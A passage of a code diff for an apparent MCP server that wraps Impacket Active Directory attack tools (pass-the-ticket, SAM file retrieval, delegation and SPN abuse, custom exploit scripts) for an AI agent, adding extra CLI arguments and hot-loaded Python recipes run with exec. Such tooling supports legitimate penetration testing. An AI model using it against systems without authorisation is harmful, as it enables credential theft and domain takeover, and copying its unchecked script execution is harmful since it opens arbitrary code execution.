+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -294,6 +1264,10 @@ class ImpacketServer(BaseMCPServer):
             description="List SMB shares on a remote Windows host with access permissions",
             params={
                 **self._auth_params(),
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 60,
@@ -317,6 +1291,10 @@ class ImpacketServer(BaseMCPServer):
                     "type": "string",
                     "required": True,
                     "description": "Path within the share (e.g., 'Windows\\System32\\config\\SAM')",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
                 },
                 "timeout": {
                     "type": "integer",
@@ -347,6 +1325,10 @@ class ImpacketServer(BaseMCPServer):
                     "required": True,
                     "description": "Content to upload",
                 },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -368,6 +1350,14 @@ class ImpacketServer(BaseMCPServer):
                     "default": False,
                     "description": "Return all user attributes (verbose)",
                 },
+                "specific_user": {
+                    "type": "string",
+                    "description": "Query a specific user by name",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -387,6 +1377,10 @@ class ImpacketServer(BaseMCPServer):
                     "default": 4000,
                     "description": "Maximum RID to enumerate (default: 4000)",
                 },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -403,6 +1397,10 @@ class ImpacketServer(BaseMCPServer):
             description="Request a Kerberos TGT and save the ccache file for pass-the-ticket attacks",
             params={
                 **self._auth_params(),
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 60,
@@ -455,6 +1453,10 @@ class ImpacketServer(BaseMCPServer):
                     "default": False,
                     "description": "Use Delegated Managed Service Accounts (DMSA) for ticket request.",
                 },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 60,
@@ -487,6 +1489,20 @@ class ImpacketServer(BaseMCPServer):
                     "type": "string",
                     "description": "Base DN for LDAPS method (e.g., 'DC=corp,DC=local'). Auto-derived from domain if omitted.",
                 },
+                "no_add": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Don't add the computer, only set its password (for existing accounts)",
+                },
+                "delete": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Delete the computer account instead of creating",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 60,
@@ -501,6 +1517,23 @@ class ImpacketServer(BaseMCPServer):
             description="Enumerate delegation settings (unconstrained, constrained, RBCD) across all domain accounts",
             params={
                 **self._auth_params(),
+                "target_domain": {
+                    "type": "string",
+                    "description": "Different domain to query (for cross-trust enumeration)",
+                },
+                "filter_user": {
+                    "type": "string",
+                    "description": "Filter for a specific user/computer",
+                },
+                "include_disabled": {
+                    "type": "boolean",
+                    "default": False,
+                    "description": "Include disabled accounts in results",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 120,
@@ -536,6 +1569,10 @@ class ImpacketServer(BaseMCPServer):
                     "type": "boolean",
                     "default": False,
                     "description": "Use LDAPS instead of LDAP",
+                },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
                 },
                 "timeout": {
                     "type": "integer",
@@ -579,6 +1616,10 @@ class ImpacketServer(BaseMCPServer):
                     "default": "smb-samr",
                     "description": "Protocol for password change/reset",
                 },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 60,
@@ -609,6 +1650,10 @@ class ImpacketServer(BaseMCPServer):
                     "default": "add",
                     "description": "Whether to add or remove the SPN",
                 },
+                "extra_args": {
+                    "type": "string",
+                    "description": "Additional CLI flags as a single string",
+                },
                 "timeout": {
                     "type": "integer",
                     "default": 60,
@@ -618,153 +1663,433 @@ class ImpacketServer(BaseMCPServer):
             handler=self.addspn,
         )
 
-        # Load dynamic recipes from session
+        # ── Custom Script Runner ─────────────────────────────────────
+
+        self.register_method(
+            name="run_custom",
+            description="Execute a custom Python script using the Impacket library. Scripts should be placed in /session/impacket-scripts/. Has access to all Impacket modules.",
+            params={
+                "script": {
+                    "type": "string",
+                    "required": True,
+                    "description": "Script filename (e.g., 'my_exploit.py') or full path in /session/impacket-scripts/",
+                },
+                "args": {
+                    "type": "string",
+                    "description": "Command-line arguments to pass to the script",
+                },
+                "timeout": {
+                    "type": "integer",
+                    "default": 120,
+                    "description": "Timeout in seconds",
+                },
+            },
+            handler=self.run_custom,
+        )
+
+        # ── Register data-driven generic methods ─────────────────────
+        self._register_generic_methods()
+
+        # ── Recipe system state ──────────────────────────────────────
+        self._recipe_dir = os.environ.get("MCP_RECIPE_DIR", RECIPE_DIR)
+        self._recipe_mtimes: Dict[str, float] = {}   # filepath -> mtime
+        self._recipe_methods: set = set()              # method names owned by recipes
+
+        # Load recipes on startup
         self._load_recipes()
 
-    # ── Dynamic Recipe System ────────────────────────────────────────
+    # ── Generic Method Registration ─────────────────────────────────────────
 
-    def _load_recipes(self):
-        """Load recipe YAML files from /session/tool_recipes/impacket/."""
-        if not os.path.isdir(RECIPE_DIR):
+    def _register_generic_methods(self):
+        """Register all methods defined in the IMPACKET_SCRIPTS table."""
+        for script_def in IMPACKET_SCRIPTS:
+            name = script_def["name"]
+            auth_style = script_def.get("auth", "target")
+            script_params = script_def.get("params", {})
+
+            # Build MCP params: auth params + script-specific params + extra_args + timeout
+            mcp_params = {}
+            if auth_style in ("target", "domain"):
+                mcp_params.update(self._auth_params())
+
+            for pname, pdef in script_params.items():
+                # Skip auth params that are already in _auth_params (only when auth was added)
+                if auth_style in ("target", "domain") and pname in AUTH_PARAM_NAMES:
+                    continue
+                mcp_param = {
+                    "type": pdef.get("type", "string"),
+                    "description": pdef.get("description", ""),
+                }
+                if pdef.get("required"):
+                    mcp_param["required"] = True
+                if "default" in pdef:
+                    mcp_param["default"] = pdef["default"]
+                if "enum" in pdef:
+                    mcp_param["enum"] = pdef["enum"]
+                mcp_params[pname] = mcp_param
+
+            mcp_params["extra_args"] = {
+                "type": "string",
+                "description": "Additional CLI flags as a single string",
+            }
+            mcp_params["timeout"] = {
+                "type": "integer",
+                "default": 60,
+                "description": "Timeout in seconds",
+            }
+
+            # Create closure to capture script_def
+            def make_handler(sd):
+                async def handler(**kw):
+                    return await self._run_generic(sd, **kw)
+                return handler
+
+            self.register_method(
+                name=name,
+                description=script_def["description"],
+                params=mcp_params,
+                handler=make_handler(script_def),
+            )
+
+    # ── Recipe System ──────────────────────────────────────────────────────
+
+    def _load_recipes(self) -> None:
+        """Scan the recipe directory and load new or modified recipe files.
+
+        Each recipe file must define a module-level ``RECIPE`` dict with at
+        least ``name`` (str), ``description`` (str), and ``auth`` (str).
+
+        Recipes whose names collide with built-in (non-recipe) methods are
+        skipped.  A recipe *can* replace a previously loaded recipe of the
+        same name (hot-update).
+
+        Errors in individual recipe files are logged and skipped -- they never
+        crash the server.
+        """
+        if not os.path.isdir(self._recipe_dir):
             return
-        for path in sorted(glob.glob(os.path.join(RECIPE_DIR, "*.yaml"))) + \
-                     sorted(glob.glob(os.path.join(RECIPE_DIR, "*.yml"))):
+
+        for filename in sorted(os.listdir(self._recipe_dir)):
+            if not filename.endswith(".py"):
+                continue
+            filepath = os.path.join(self._recipe_dir, filename)
+            if not os.path.isfile(filepath):
+                continue
+
             try:
-                mtime = os.path.getmtime(path)
-                cached_mtime = self._recipe_file_mtimes.get(path)
-                if cached_mtime == mtime:
-                    continue  # file unchanged since last load
+                mtime = os.path.getmtime(filepath)
+            except OSError:
+                continue
 
-                with open(path) as f:
-                    recipe = yaml.safe_load(f)
-                if not recipe or not recipe.get("name"):
-                    continue
-                name = recipe["name"]
+            # Skip if already loaded and not modified
+            if filepath in self._recipe_mtimes and self._recipe_mtimes[filepath] == mtime:
+                continue
 
-                # Never override built-in methods
-                if name in self.methods and name not in self._recipe_methods:
-                    self.logger.warning(f"Recipe '{name}' conflicts with built-in method, skipping")
-                    continue
+            try:
+                self._load_single_recipe(filepath, mtime)
+            except Exception as exc:
+                self.logger.error(f"Failed to load recipe {filepath}: {exc}")
 
-                self._register_recipe(name, recipe)
-                self._recipe_file_mtimes[path] = mtime
-                self.logger.info(f"Loaded recipe: {name} from {os.path.basename(path)}")
-            except Exception as e:
-                self.logger.warning(f"Recipe load failed {path}: {e}")
+    def _load_single_recipe(self, filepath: str, mtime: float) -> None:
+        """Load a single recipe file, register its method, and track mtime."""
+        with open(filepath, "r") as f:
+            source = f.read()
 
-    def _maybe_reload_recipes(self):
-        """Check for new or modified recipe files and reload if needed."""
-        if not os.path.isdir(RECIPE_DIR):
+        code = compile(source, filepath, "exec")
+        module = types.ModuleType(f"_recipe_impacket_{os.path.basename(filepath)[:-3]}")
+        module.__file__ = filepath
+        exec(code, module.__dict__)
+
+        recipe_def = getattr(module, "RECIPE", None)
+        if not isinstance(recipe_def, dict):
+            self.logger.warning(f"Recipe {filepath} missing RECIPE dict, skipping")
             return
-        current_files = set(
-            glob.glob(os.path.join(RECIPE_DIR, "*.yaml")) +
-            glob.glob(os.path.join(RECIPE_DIR, "*.yml"))
-        )
-        cached_files = set(self._recipe_file_mtimes.keys())
 
-        # Check for new files or modified files
-        needs_reload = current_files != cached_files
-        if not needs_reload:
-            for path in current_files:
-                try:
-                    if os.path.getmtime(path) != self._recipe_file_mtimes.get(path):
-                        needs_reload = True
-                        break
-                except OSError:
-                    needs_reload = True
-                    break
+        name = recipe_def.get("name")
+        if not name or not isinstance(name, str):
+            self.logger.warning(f"Recipe {filepath} has invalid or missing 'name', skipping")
+            return
 
-        if needs_reload:
-            # Clean up removed recipe methods
-            removed_files = cached_files - current_files
-            for path in removed_files:
-                del self._recipe_file_mtimes[path]
-            self._load_recipes()
+        description = recipe_def.get("description", f"Recipe method: {name}")
 
-    def _register_recipe(self, name: str, recipe: Dict[str, Any]):
-        """Register a dynamic recipe method with inherited auth params."""
-        recipe_params = recipe.get("params", {})
-        auth_style = recipe.get("auth", "target")
+        # Conflict check: don't overwrite built-in methods
+        if name in self.methods and name not in self._recipe_methods:
+            self.logger.warning(
+                f"Recipe '{name}' from {filepath} conflicts with built-in method, skipping"
+            )
+            return
 
-        # Build recipe-specific params (excluding auth params handled by builders)
-        extra = {
-            "timeout": {"type": "integer", "default": 60, "description": "Timeout in seconds"},
-            **{k: {"type": v.get("type", "string"),
-                    "required": v.get("required", False),
-                    "description": v.get("description", "")}
-               for k, v in recipe_params.items() if k not in AUTH_PARAM_NAMES}
+        auth_style = recipe_def.get("auth", "none")
+        recipe_params = recipe_def.get("params", {})
+
+        # Build MCP params: auth params (if needed) + recipe-specific params + extra_args + timeout
+        mcp_params: Dict[str, Dict[str, Any]] = {}
+        if auth_style in ("target", "domain"):
+            mcp_params.update(self._auth_params())
+
+        for pname, pdef in recipe_params.items():
+            # Skip auth params already added
+            if auth_style in ("target", "domain") and pname in AUTH_PARAM_NAMES:
+                continue
+            mcp_param: Dict[str, Any] = {
+                "type": pdef.get("type", "string"),
+                "description": pdef.get("description", ""),
+            }
+            if pdef.get("required"):
+                mcp_param["required"] = True
+            if "default" in pdef:
+                mcp_param["default"] = pdef["default"]
+            if "enum" in pdef:
+                mcp_param["enum"] = pdef["enum"]
+            mcp_params[pname] = mcp_param
+
+        mcp_params["extra_args"] = {
+            "type": "string",
+            "description": "Additional CLI flags as a single string",
+        }
+        mcp_params["timeout"] = {
+            "type": "integer",
+            "default": 60,
+            "description": "Timeout in seconds",
         }
 
-        if auth_style in ("target", "domain"):
-            all_params = self._auth_params(extra_params=extra)
-        else:
-            # auth: none — no inherited auth params
-            all_params = extra
+        # Check for custom handler in the recipe module
+        custom_handler = getattr(module, "handler", None)
 
-        # Use default arg to capture recipe in closure
-        def make_handler(r):
-            async def handler(**kw):
-                return await self._run_recipe(r, **kw)
-            return handler
+        if custom_handler is not None:
+            # Custom handler: wrap so it receives `server` as first arg
+            def _bind_custom(h):
+                async def _handler(**kwargs):
+                    return await h(self, **kwargs)
+                return _handler
+
+            handler = _bind_custom(custom_handler)
+        else:
+            # Use the same _run_generic handler that IMPACKET_SCRIPTS uses
+            binary = recipe_def.get("binary")
+            script = recipe_def.get("script")
+            if not binary and not script:
+                self.logger.warning(
+                    f"Recipe '{name}' from {filepath} has no handler, binary, or script, skipping"
+                )
+                return
+
+            # Build a script_def compatible with _run_generic
+            generic_def = {
+                "name": name,
+                "description": description,
+                "auth": auth_style,
+                "params": recipe_params,
+            }
+            if binary:
+                generic_def["binary"] = binary
+            if script:
+                generic_def["script"] = script
+
+            def _bind_generic(sd):
+                async def _handler(**kwargs):
+                    return await self._run_recipe_generic(sd, **kwargs)
+                return _handler
+
+            handler = _bind_generic(generic_def)
 
         self.register_method(
             name=name,
-            description=recipe.get("description", f"Dynamic method: {name}"),
-            params=all_params,
-            handler=make_handler(recipe),
+            description=description,
+            params=mcp_params,
+            handler=handler,
         )
+        self._recipe_mtimes[filepath] = mtime
         self._recipe_methods.add(name)
+        self.logger.info(f"Loaded recipe: {name} from {filepath}")
 
-    async def _run_recipe(self, recipe: Dict[str, Any], **kwargs) -> ToolResult:
-        """Execute a dynamic recipe method."""
-        timeout = kwargs.pop("timeout", 60)
-        auth_style = recipe.get("auth", "target")
+    def _maybe_reload_recipes(self) -> None:
+        """Check for new, modified, or deleted recipe files and reload.
 
-        # Extract auth kwargs
-        auth_kw = {k: kwargs.pop(k, None) for k in list(AUTH_PARAM_NAMES) if k in kwargs}
+        Called before every tool call and list_tools to enable hot-reload.
+        """
+        if not os.path.isdir(self._recipe_dir):
+            # Recipe dir was removed -- unregister all recipe methods
+            if self._recipe_methods:
+                for method_name in list(self._recipe_methods):
+                    self.methods.pop(method_name, None)
+                self._recipe_methods.clear()
+                self._recipe_mtimes.clear()
+            return
 
-        # Build auth args using existing builders
-        if auth_style == "domain":
-            identity, extra = self._build_domain_auth_args(**{
-                k: v for k, v in auth_kw.items() if v is not None
-                and k in ("target", "username", "password", "domain", "hashes",
-                          "kerberos", "dc_ip", "aes_key", "port")
-            })
-        elif auth_style == "target":
-            identity, extra = self._build_auth_args(**{
-                k: v for k, v in auth_kw.items() if v is not None
-                and k in ("target", "username", "password", "domain", "hashes",
-                          "kerberos", "dc_ip", "aes_key", "port")
-            })
+        # Collect current .py files on disk
+        try:
+            current_files = {
+                os.path.join(self._recipe_dir, f)
+                for f in os.listdir(self._recipe_dir)
+                if f.endswith(".py") and os.path.isfile(os.path.join(self._recipe_dir, f))
+            }
+        except OSError:
+            return
+
+        tracked_files = set(self._recipe_mtimes.keys())
+
+        # Detect if anything changed
+        needs_scan = current_files != tracked_files
+        if not needs_scan:
+            for fpath in current_files:
+                try:
+                    if os.path.getmtime(fpath) != self._recipe_mtimes.get(fpath):
+                        needs_scan = True
+                        break
+                except OSError:
+                    needs_scan = True
+                    break
+
+        if not needs_scan:
+            return
+
+        # Unregister methods from deleted recipe files
+        deleted_files = tracked_files - current_files
+        if deleted_files:
+            for method_name in list(self._recipe_methods):
+                self.methods.pop(method_name, None)
+            self._recipe_methods.clear()
+            self._recipe_mtimes.clear()
+
+        # (Re-)load all current recipe files
+        self._load_recipes()
+
+    async def _handle_tool_call(self, name, arguments):
+        """Override to hot-reload recipes before dispatch."""
+        self._maybe_reload_recipes()
+        return await super()._handle_tool_call(name, arguments)
+
+    def _get_tools(self):
+        """Override to hot-reload recipes before listing."""
+        self._maybe_reload_recipes()
+        return super()._get_tools()
+
+    async def _run_recipe_generic(self, script_def: Dict[str, Any], **kwargs) -> ToolResult:
+        """Execute a recipe method using the same pattern as _run_generic.
+
+        This is a thin wrapper around _run_generic that handles the `script`
+        field (custom Python scripts run with python3 <script> instead of binary).
+        """
+        script_path = script_def.get("script")
+        if script_path:
+            # For script-based recipes, set binary to "python3" and prepend
+            # the script path as a positional parameter
+            modified_def = dict(script_def)
+            modified_def["binary"] = "python3"
+            modified_def.pop("script", None)
+            # Inject the script path as the first positional arg via _subcommand
+            modified_def["_subcommand"] = script_path
+            return await self._run_generic(modified_def, **kwargs)
         else:
-            identity, extra = "", []
+            return await self._run_generic(script_def, **kwargs)
+
+    async def _run_generic(self, script_def: Dict[str, Any], **kwargs) -> ToolResult:
+        """Execute a data-driven generic method."""
+        timeout = kwargs.pop("timeout", 60)
+        extra_args_str = kwargs.pop("extra_args", None)
+        auth_style = script_def.get("auth", "target")
+
+        # Extract auth kwargs (only for methods that use standard auth)
+        auth_kw = {}
+        if auth_style in ("target", "domain"):
+            auth_kw = {k: kwargs.pop(k, None) for k in list(AUTH_PARAM_NAMES) if k in kwargs}
+            # Remove None values
+            auth_kw = {k: v for k, v in auth_kw.items() if v is not None}
+
+        # Build auth args
+        identity_str = ""
+        auth_args = []
+        if auth_style == "domain":
+            identity_str, auth_args = self._build_domain_auth_args(**auth_kw)
+        elif auth_style == "target":
+            identity_str, auth_args = self._build_auth_args(**auth_kw)
+
+        # Some scripts (e.g., getPac.py) don't accept -dc-ip
+        if script_def.get("_no_dc_ip"):
+            filtered = []
+            skip_next = False
+            for arg in auth_args:
+                if skip_next:
+                    skip_next = False
+                    continue
+                if arg == "-dc-ip":
+                    skip_next = True
+                    continue
+                filtered.append(arg)
+            auth_args = filtered
 
         # Build command
-        binary = recipe.get("binary", f"impacket-{recipe['name']}")
-        cmd = binary.split() if " " in binary else [binary]
-        cmd.extend(extra)
+        binary = script_def.get("binary", f"impacket-{script_def['name']}")
+        cmd = [binary]
 
-        # Translate recipe params to CLI flags
-        recipe_params = recipe.get("params", {})
-        for param_name, value in kwargs.items():
+        # Add subcommand if defined (e.g., dpapi backupkeys)
+        subcommand = script_def.get("_subcommand")
+        if subcommand and not script_def.get("_subcommand_after_identity"):
+            cmd.append(subcommand)
+
+        cmd.extend(auth_args)
+
+        # Collect positional args (flag == ""), positional-after-identity, and
+        # regular flag args.  Flag args must come AFTER identity and any
+        # positional-after-identity subcommands (e.g., services/reg/net/tstool)
+        # because Impacket argparse subparsers define their own flags.
+        positional_args = []
+        positional_after_identity = []
+        flag_args = []
+        script_params = script_def.get("params", {})
+
+        for pname, value in list(kwargs.items()):
             if value is None:
                 continue
-            param_def = recipe_params.get(param_name, {})
-            flag = param_def.get("flag", f"--{param_name.replace('_', '-')}")
-            if not flag:
-                # Positional argument (no flag prefix)
-                cmd.append(str(value))
-            elif param_def.get("type") == "boolean":
+            pdef = script_params.get(pname, {})
+            flag = pdef.get("flag")
+            if flag is None:
+                # Default flag derivation
+                flag = f"-{pname.replace('_', '-')}"
+
+            if pdef.get("_positional_after_identity"):
+                positional_after_identity.append(str(value))
+                continue
+
+            if flag == "":
+                # Positional argument
+                positional_args.append(str(value))
+            elif pdef.get("type") == "boolean":
                 if value:
-                    cmd.append(flag)
+                    flag_args.append(flag)
             else:
-                cmd.extend([flag, str(value)])
+                flag_args.extend([flag, str(value)])
 
-        # Append identity string (impacket convention: last positional arg)
-        if identity:
-            cmd.append(identity)
+        # Append identity string (some scripts use a flag like -t instead of positional)
+        identity_flag = script_def.get("_identity_flag")
+        if identity_str:
+            if identity_flag:
+                cmd.extend([identity_flag, identity_str])
+            else:
+                cmd.append(identity_str)
 
-        # Build env (KRB5CCNAME)
+        # Append subcommand after identity if flagged
+        if subcommand and script_def.get("_subcommand_after_identity"):
+            cmd.append(subcommand)
+
+        # Append positional args after identity (e.g., action subcommands)
+        for arg in positional_after_identity:
+            cmd.append(arg)
+
+        # Append flag args AFTER identity and subcommands so argparse
+        # subparsers (services, reg, net, etc.) can parse them correctly
+        cmd.extend(flag_args)
+
+        # Append positional args last
+        for arg in positional_args:
+            cmd.append(arg)
+
+        # Append extra_args
+        if extra_args_str:
+            cmd.extend(shlex.split(extra_args_str))
+
+        # Build env
         env = {}
         kerberos = auth_kw.get("kerberos", False)
         if kerberos:
@@ -774,25 +2099,95 @@ class ImpacketServer(BaseMCPServer):
             env["KRB5CCNAME"] = ccache
 
         try:
-            result = await self.run_command(cmd, timeout=timeout, env=env)
+            result = await self.run_command_with_progress(cmd, env=env)
             combined = result.stdout + result.stderr
+            has_error = self._has_error_in_output(combined)
+            success = result.returncode == 0 and not has_error
+
+            error_class = None
+            retryable = False
+            suggestions = []
+            error_msg = None
+            if not success:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                error_msg = combined.strip().split("\n")[-1] if combined.strip() else f"{script_def['name']} failed"
 
             return ToolResult(
-                success=result.returncode == 0,
-                data={"command": " ".join(cmd), "method": recipe["name"]},
+                success=success,
+                data={"command": " ".join(cmd), "method": script_def["name"]},
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
+            )
+        except ToolError as e:
+            error_class, retryable, suggestions = self._classify_error(str(e))
+            return ToolResult(
+                success=False,
+                data={"command": " ".join(cmd), "method": script_def["name"]},
+                error=str(e),
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
+            )
+
+    # ── Custom Script Runner ────────────────────────────────────────────────
+
+    async def run_custom(
+        self,
+        script: str,
+        args: Optional[str] = None,
+        timeout: int = 120,
+    ) -> ToolResult:
+        """Execute a custom Python script from /session/impacket-scripts/."""
+        # Resolve script path
+        if os.path.isabs(script):
+            script_path = script
+        else:
+            script_path = os.path.join(CUSTOM_SCRIPT_DIR, script)
+
+        if not os.path.exists(script_path):
+            return ToolResult(
+                success=False,
+                data={"script": script},
+                error=f"Script not found: {script_path}. Place custom scripts in {CUSTOM_SCRIPT_DIR}/",
+                error_class="params",
+            )
+
+        cmd = ["python3", script_path]
+        if args:
+            cmd.extend(shlex.split(args))
+
+        try:
+            result = await self.run_command_with_progress(cmd)
+            combined = result.stdout + result.stderr
+            if result.returncode != 0:
+                error_class, retryable, suggestions = self._classify_error(combined)
+                return ToolResult(
+                    success=False,
+                    data={"script": script, "command": " ".join(cmd)},
+                    raw_output=sanitize_output(combined),
+                    error=combined.strip().split("\n")[-1] if combined.strip() else "Script execution failed",
+                    error_class=error_class,
+                    retryable=retryable,
+                    suggestions=suggestions,
+                )
+            return ToolResult(
+                success=True,
+                data={"script": script, "command": " ".join(cmd)},
                 raw_output=sanitize_output(combined),
             )
         except ToolError as e:
+            ec, rt, sg = self._classify_error(str(e))
             return ToolResult(
                 success=False,
-                data={"command": " ".join(cmd), "method": recipe["name"]},
+                data={"script": script},
                 error=str(e),
+                error_class=ec,
+                retryable=rt,
+                suggestions=sg,
             )
-
-    async def _handle_tool_call(self, name, arguments):
-        """Override to check for new recipes before handling calls."""
-        self._maybe_reload_recipes()
-        return await super()._handle_tool_call(name, arguments)
 
     # ── State Management ──────────────────────────────────────────────
 
@@ -800,7 +2195,8 @@ class ImpacketServer(BaseMCPServer):
         """Restore credential state from /session/credentials/ on container start."""
         if not os.path.isdir(CRED_DIR):
             return
-        for ccache in glob.glob(os.path.join(CRED_DIR, "*.ccache")):
+        import glob as _glob
+        for ccache in _glob.glob(os.path.join(CRED_DIR, "*.ccache")):
             principal = os.path.splitext(os.path.basename(ccache))[0]
             self._tickets[principal] = ccache
             self._active_principal = principal  # last one wins as default
@@ -920,12 +2316,10 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        **_extra,
     ) -> tuple:
         """
         Build Impacket CLI authentication format for target-based tools.
-
-        Used by: psexec, wmiexec, smbexec, dcomexec, atexec, secretsdump,
-                 lookupsid, smbclient (smb_shares/get/put).
 
         Returns:
             (target_str, extra_args) where target_str is '[domain/]user[:pass]@target'
@@ -974,16 +2368,10 @@ class ImpacketServer(BaseMCPServer):
         dc_ip: Optional[str] = None,
         aes_key: Optional[str] = None,
         port: Optional[int] = None,
+        **_extra,
     ) -> tuple:
         """
         Build Impacket CLI authentication format for domain-based tools.
-
-        Used by: GetUserSPNs (kerberoast), GetNPUsers (asreproast),
-                 GetADUsers, getTGT.
-
-        These tools expect 'domain/user[:pass]' (no @target). The DC IP
-        is passed via -dc-ip flag, using the 'target' param if dc_ip is
-        not explicitly set.
 
         Returns:
             (identity_str, extra_args) where identity_str is 'domain/user[:pass]'
@@ -1020,6 +2408,12 @@ class ImpacketServer(BaseMCPServer):
 
         return identity_str, extra_args
 
+    def _parse_extra_args(self, extra_args: Optional[str]) -> List[str]:
+        """Parse extra_args string into a list of CLI arguments."""
+        if not extra_args:
+            return []
+        return shlex.split(extra_args)
+
     def _parse_exec_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
         """Parse output from execution commands (psexec, wmiexec, etc.)."""
         combined = stdout + stderr
@@ -1035,6 +2429,139 @@ class ImpacketServer(BaseMCPServer):
             "info": [l.strip() for l in combined.split("\n") if l.startswith("[*]") or l.startswith("[+]")],
             "warnings": [l.strip() for l in combined.split("\n") if l.startswith("[!]") or l.startswith("[-]")],
         }
+
+    # ── Error Classification Helpers ─────────────────────────────────────
+
+    # Error patterns that indicate failure even when returncode == 0.
+    # Impacket scripts frequently exit 0 on auth failures, access denied, etc.
+    _ERROR_PATTERNS = [
+        "SessionError", "STATUS_", "KDC_ERR", "KRB_AP_ERR",
+        "INSUFF_ACCESS_RIGHTS", "rpc_s_access_denied",
+        "CO_E_RUNAS_LOGON_FAILURE", "REGDB_E_CLASSNOTREG",
+        "ERROR_DS_DRA", "Target principal not found",
+        "Kerberos SessionError", "WBEM_E_ACCESS_DENIED",
+    ]
+
+    def _has_error_in_output(self, combined: str) -> bool:
+        """Check combined stdout+stderr for known error patterns.
+
+        Impacket tools often exit with returncode 0 even when they fail.
+        This method catches those false-success cases.
+        """
+        return any(pat in combined for pat in self._ERROR_PATTERNS)
+
+    def _classify_kerberos_error(self, text: str) -> tuple:
+        """Classify Kerberos errors by error code.
+
+        Returns (error_class, retryable, suggestions).
+        """
+        if "KRB_AP_ERR_SKEW" in text:
+            return ("config", True, [
+                "Clock skew too great — use clock_offset parameter on the mcp_tool call to match the target DC time",
+                "Use 'nmap -sV -p 88 <dc_ip>' or 'net time' to discover the DC's time",
+            ])
+        if "KDC_ERR_PREAUTH_FAILED" in text:
+            return ("auth", False, [
+                "Pre-authentication failed — wrong password, hash, or AES key",
+                "Verify credentials are correct for this domain",
+            ])
+        if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in text:
+            return ("auth", False, [
+                "User principal not found in Kerberos database",
+                "Check username and domain are correct",
+            ])
+        if "KDC_ERR_S_PRINCIPAL_UNKNOWN" in text:
+            return ("params", False, [
+                "Service principal not found — verify the SPN is correct",
+                "Use 'find_delegation' or 'kerberoast' to discover valid SPNs",
+            ])
+        if "KDC_ERR_CLIENT_REVOKED" in text:
+            return ("auth", False, [
+                "Account is locked or disabled",
+            ])
+        if "KRB_ERR_GENERIC" in text or "KDC_ERR_BADOPTION" in text:
+            return ("config", True, [
+                "Kerberos configuration error — check domain, DC IP, and authentication params",
+            ])
+        if "KDC_ERR_KEY_EXPIRED" in text:
+            return ("auth", False, [
+                "Password has expired — use changepasswd to reset",
+            ])
+        if "KDC_ERR_ETYPE_NOSUPP" in text:
+            return ("config", False, [
+                "Encryption type not supported — the DC may not support the requested encryption",
+            ])
+        # Generic Kerberos error
+        if "KerberosError" in text or "Kerberos SessionError" in text:
+            return ("auth", False, [])
+        return ("unknown", False, [])
+
+    def _classify_smb_error(self, text: str) -> tuple:
+        """Classify SMB/RPC errors by status code.
+
+        Returns (error_class, retryable, suggestions).
+        """
+        if "STATUS_LOGON_FAILURE" in text:
+            return ("auth", False, [
+                "Logon failed — wrong username, password, or domain",
+            ])
+        if "STATUS_ACCESS_DENIED" in text:
+            return ("permission", False, [
+                "Access denied — insufficient privileges for this operation",
+                "Try with a higher-privileged account or different authentication method",
+            ])
+        if "STATUS_ACCOUNT_DISABLED" in text:
+            return ("auth", False, [
+                "Account is disabled",
+            ])
+        if "STATUS_ACCOUNT_LOCKED_OUT" in text:
+            return ("auth", False, [
+                "Account is locked out — wait or unlock via ADUC",
+            ])
+        if "STATUS_PASSWORD_EXPIRED" in text:
+            return ("auth", False, [
+                "Password expired — use changepasswd to set a new password",
+            ])
+        if "STATUS_PASSWORD_MUST_CHANGE" in text:
+            return ("auth", False, [
+                "Password must be changed before login — use changepasswd",
+            ])
+        if "Connection refused" in text:
+            return ("network", True, [
+                "Connection refused — target may be down or port is filtered",
+            ])
+        if "STATUS_SHARING_VIOLATION" in text:
+            return ("permission", True, [
+                "File is locked by another process — retry later",
+            ])
+        if "STATUS_BAD_NETWORK_NAME" in text:
+            return ("params", False, [
+                "Share name not found — verify the share name exists",
+            ])
+        if "SessionError" in text:
+            return ("unknown", False, [])
+        return ("unknown", False, [])
+
+    def _classify_error(self, text: str) -> tuple:
+        """Classify any impacket error. Returns (error_class, retryable, suggestions)."""
+        if not text:
+            return ("unknown", False, [])
+        # Try Kerberos first
+        if "Kerberos" in text or "KRB_" in text or "KDC_ERR" in text:
+            return self._classify_kerberos_error(text)
+        # Then SMB
+        if "STATUS_" in text or "SMB SessionError" in text or "Connection refused" in text:
+            return self._classify_smb_error(text)
+        # DRSUAPI errors
+        if "ERROR_DS_DRA" in text:
+            return ("permission", False, [
+                "DRSUAPI replication error — insufficient privileges or wrong target",
+                "Try with -use-vss flag as an alternative",
+            ])
